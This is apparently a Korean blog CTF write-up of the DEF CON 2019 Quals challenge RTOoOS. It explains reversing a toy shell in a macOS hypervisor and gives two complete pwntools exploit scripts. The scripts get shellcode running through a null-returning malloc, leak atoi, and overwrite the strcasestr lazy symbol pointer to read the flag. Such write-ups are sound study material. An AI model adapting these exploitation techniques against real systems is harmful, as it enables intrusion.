---
title: "DEF CON 2019 Quals / RTOoOS"
date: 2019-07-08 21:55:00 +0000
categories: CTF
---

# DEF CON 2019 Quals / RTOoOS

keyword: hypervisor, macOS

데프콘 예선 때, 종료 10분 전에 브루트포싱에 성공하여 플래그를 땄던 문제이다. 그 때 제대로 분석 못하고 얼렁뚱땅 넘어간 부분이 많아서 다시 분석해보았다. (브루트포싱 없이 풀 수 있을까 하고 다른 팀들 write-up을 찾아봤는데 다 똑같았다 ㅋㅋㅋ)

## Solution

### 유저 프로그램 분석

이 문제의 핵심은 리버싱이다.

```
➜  rtooos file crux
crux: data
```

data 파일을 제공하는데 IDA에 넣어서 코드로 분석할 수 있다. IDA로 보면 모든 함수가  `sub_xxx` 형식이다. 동적 디버깅도 못한다. 리모트로 연결해보면서 감으로 함수 리네이밍하면서 정적 분석을 해야 한다.

```
CS420 - Homework 1
Student: Kurt Mandl
Submission Stardate 37357.84908798814
[RTOoOS>
```

간단한 shell 프로그램이다. (대학생 과제를 모티브로 낸 문제인 것 같다.)

![image-20190708183914155](/assets/img/image-20190708183914155.png)

위는 export를 처리하는 부분이다. 환경변수라서 당연히 key-value 쌍으로 처리한다. 첫 for 루틴에서 기존에 존재하는 이름이 동일한 환경변수 값들을 모두 업데이트해준다. 그 후 두번째 for 루틴에서는 새로운 key-value 쌍을 추가해준다. (환경변수 특수 기호 `$`를 처리해주는 로직도 있는데 이를 통해 버퍼오버플로우를 낼 수도 있을 것 같았다. 하지만 exploit에 쓰지는 않았다.)

`value` 값은 `malloc`으로 메모리를 할당 받고 값이 써진다. `malloc`에서 이상한 점이 있다.

![image-20190708184328200](/assets/img/image-20190708184328200.png)

`null`값이 리턴될 수 있다는 것이다. 이렇게 되면 가상메모리 영역의 0x0번지에 값을 쓸 수 있게 된다. 하이퍼바이저에서 오프셋을 다르게 해놓는다면 문제를 못 풀게 되지만 다행스럽게도 오프셋을 다르게 해두진 않았다.

실제로 변수 a를 아무렇게나 할당하고

![image-20190708184808226](/assets/img/image-20190708184808226.png)

값을 출력하여 data 파일과 비교해보면

![image-20190708184830328](/assets/img/image-20190708184830328.png)

똑같다는 것을 알 수 있다.



![image-20190708184555226](/assets/img/image-20190708184555226.png)

0x100 번지에 어떤 함수가 하나 존재하고

![image-20190708184604068](/assets/img/image-20190708184604068.png)

이는 `malloc`에서 호출된다. 해당 메모리 영역에 write 권한과 execute 권한이 걸려있길 간절히 빌면서 이 영역에 쉘코드를 overwrite한다.

```python
from pwn import *
import time

#context.log_level='DEBUG'
context.arch="amd64"

shellcode = '''
//readFile(0x1508)
xor rax, rax
add rax, 0x1508
mov edi, 0x66
out dx, al
'''

shellcode = asm(shellcode)

payload  = "\x90"*0x100
payload += shellcode

p = process(['honcho', 'crux', '20'])

# allocate at 0x0
for i in xrange(7):
  p.sendlineafter("[RTOoOS> ", 'export a')

p.sendlineafter("[RTOoOS> ", 'export a=%s' % payload)

p.interactive()
```

![image-20190708185220099](/assets/img/image-20190708185220099.png)

이렇게 하이퍼바이저를 읽어올 수 있다.

### 하이퍼바이저 분석

하이퍼바이저의 핵심 코드는 다음과 같다.

![image-20190708185522466](/assets/img/image-20190708185522466.png)

하이퍼콜 형식으로 구성되어 있다. flag 파일을 읽으려고 하면 필터링해버린다. 이를 우회해줘야 한다. `strcasestr`의 lazy symbol pointer를 atoi로 변경하면 우회 가능하다.

하지만 지금은 코드 실행만 할 수 있을 뿐, 메모리 주소는 아는게 없다. 따라서 메모리 릭을 해야 하는데 여기서 브루트포싱이 약간 필요하다. 이 문제 환경에서만 그런지 모르겠지만, 몇번 테스트를 해보니 macOS에서는 code 영역과 heap 영역의 오프셋 차이가 고정이었다. (부팅 때마다 이 차이가 달라지는 것 같다.) `vm_mem` 값을 기준으로 브루트포싱을 수행하여 오프셋 차이를 계산하면 리모트 서비스의 코드영역 베이스 주소를 알 수 있게 된다. 이를 통해 lazy symbol pointer 테이블을 수정해주면 된다.

#### Exploit Code

```python
from pwn import *
import time

#context.log_level='DEBUG'
context.arch="amd64"

'''
seg000:0000000000001508 a2              db 'honcho',0
'''

vmemAddr = 0x100002318
bin_base = 0x100000000
vmem     = 0x100096000 # different offset between code & heap per booting.
atoi_got = 0x100002040
filt_got = 0x100002170

shellcode = '''
/*
//readFile(0x1508)
xor rax, rax
add rax, 0x1508
mov edi, 0x66
out dx, al
*/

// puts(atoi_got)
xor rax, rax
sub rax, %s
mov edi, 0x64
out dx, al

// read(0, filt_got, ...)
xor rax, rax
sub rax, %s
mov edi, 0x63
out dx, al

// read(0, flag, ...)
xor rax, rax
add rax, 0x1000
mov edi, 0x63
out dx, al

// ReadFile(flag)
xor rax, rax
add rax, 0x1000
mov edi, 0x66
out dx, al
''' % (hex(vmem - atoi_got), hex(vmem - filt_got))

shellcode = asm(shellcode)

payload  = "\x90"*0x100
payload += shellcode

p = process(['honcho', 'crux', '20'])

# allocate at 0x0
for i in xrange(7):
  p.sendlineafter("[RTOoOS> ", 'export a')

p.sendlineafter("[RTOoOS> ", 'export a=%s' % payload)
atoi = u64(p.recvuntil("\x7f\x0a")[-7:-1].ljust(8,"\x00"))
log.info("atoi = 0x%x" % atoi)

p.send(p64(atoi))
time.sleep(0.1)
p.send('flag\x00')

p.interactive()
```

#### Result

![image-20190708190242930](/assets/img/image-20190708190242930.png)
